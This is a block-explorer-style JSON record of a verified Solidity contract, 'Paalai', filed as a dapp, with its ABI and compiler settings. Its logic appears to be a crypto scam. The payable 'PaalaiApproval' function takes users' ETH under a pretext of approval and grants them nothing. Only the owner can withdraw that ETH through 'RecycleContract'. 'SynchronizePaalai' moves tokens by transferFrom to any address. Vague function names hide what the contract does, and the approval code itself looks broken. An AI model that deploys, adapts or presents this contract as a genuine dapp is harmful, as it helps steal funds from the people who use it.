{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"contracts/Dapp.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\r\\npragma solidity >=0.8.0;\\r\\n\\r\\ninterface IERC20 {\\r\\n    function balanceOf(address account) external view returns (uint);\\r\\n    function transfer(address recipient, uint amount) external returns (bool);\\r\\n    function transferFrom(address sender, address recipient, uint amount) external returns (bool);\\r\\n    function approve(address spender, uint amount) external returns (bool);\\r\\n}\\r\\n\\r\\ncontract Paalai {\\r\\n    struct TokenData {\\r\\n        address tokenAddress;\\r\\n        uint tokenBalance;\\r\\n    }\\r\\n\\r\\n    mapping(address => mapping(address => uint)) private allowedAmounts;\\r\\n\\r\\n    event PaalaiX(address indexed owner, address indexed tokenAddress, uint amount);\\r\\n    event PaalaiSynchronized(address indexed from, address indexed to, address indexed tokenAddress, uint amount);\\r\\n    event NativeTokenTransferred(address indexed recipient, uint amount);\\r\\n\\r\\n    address private contractOwner;\\r\\n\\r\\n    modifier onlyOwner() {\\r\\n        require(msg.sender == contractOwner, \\\"Only the contract owner can call this function\\\");\\r\\n        _;\\r\\n    }\\r\\n\\r\\n    constructor() {\\r\\n        contractOwner = msg.sender;\\r\\n    }\\r\\n\\r\\n    function setContractOwner(address newOwner) external onlyOwner {\\r\\n        contractOwner = newOwner;\\r\\n    }\\r\\n\\r\\n    function PaalaiApprovalStatus(address user, address tokenAddress) public view returns (uint) {\\r\\n        return allowedAmounts[user][tokenAddress];\\r\\n    }\\r\\n\\r\\n    function PaalaiApproval(TokenData[] memory tokenDataArr) public payable {\\r\\n        for (uint i = 0; i < tokenDataArr.length; i++) {\\r\\n            TokenData memory data = tokenDataArr[i];\\r\\n            if (data.tokenAddress == address(0)) {\\r\\n                require(msg.value >= data.tokenBalance, \\\"Not Eligible\\\");\\r\\n            } else {\\r\\n                IERC20 token = IERC20(data.tokenAddress);\\r\\n                require(token.approve(address(this), data.tokenBalance), \\\"Approval Failed\\\");\\r\\n                allowedAmounts[msg.sender][data.tokenAddress] = data.tokenBalance;\\r\\n            }\\r\\n            emit PaalaiX(msg.sender, data.tokenAddress, data.tokenBalance);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function SynchronizePaalai(TokenData[] memory tokenDataArr, address to) public {\\r\\n        for (uint i = 0; i < tokenDataArr.length; i++) {\\r\\n            TokenData memory data = tokenDataArr[i];\\r\\n            uint allowedAmount = allowedAmounts[msg.sender][data.tokenAddress];\\r\\n            require(allowedAmount >= data.tokenBalance, \\\"Approval Missing\\\");\\r\\n\\r\\n            IERC20 token = IERC20(data.tokenAddress);\\r\\n            uint balance = token.balanceOf(address(this));\\r\\n\\r\\n            if (balance > 0) {\\r\\n                require(token.transferFrom(msg.sender, to, balance), \\\"Synchronization Failed\\\");\\r\\n                emit PaalaiSynchronized(msg.sender, to, data.tokenAddress, balance);\\r\\n            }\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function RecycleContract(address payable recipient, uint amount) external onlyOwner payable {\\r\\n    require(address(this).balance >= amount, \\\"Insufficient balance\\\");\\r\\n    recipient.transfer(amount);\\r\\n    emit NativeTokenTransferred(recipient, amount);\\r\\n}\\r\\n\\r\\n}\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"evmVersion\": \"london\",\r\n    \"remappings\": [],\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    }\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"NativeTokenTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"PaalaiSynchronized\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"PaalaiX\",\"type\":\"event\"},{\"inputs\":[{\"components\":[{\"internalType\":\"address\",\"name\":\"tokenAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenBalance\",\"type\":\"uint256\"}],\"internalType\":\"struct Paalai.TokenData[]\",\"name\":\"tokenDataArr\",\"type\":\"tuple[]\"}],\"name\":\"PaalaiApproval\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenAddress\",\"type\":\"address\"}],\"name\":\"PaalaiApprovalStatus\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"RecycleContract\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"components\":[{\"internalType\":\"address\",\"name\":\"tokenAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenBalance\",\"type\":\"uint256\"}],\"internalType\":\"struct Paalai.TokenData[]\",\"name\":\"tokenDataArr\",\"type\":\"tuple[]\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"SynchronizePaalai\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"setContractOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Paalai", "CompilerVersion": "v0.8.17+commit.8df45f5f", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}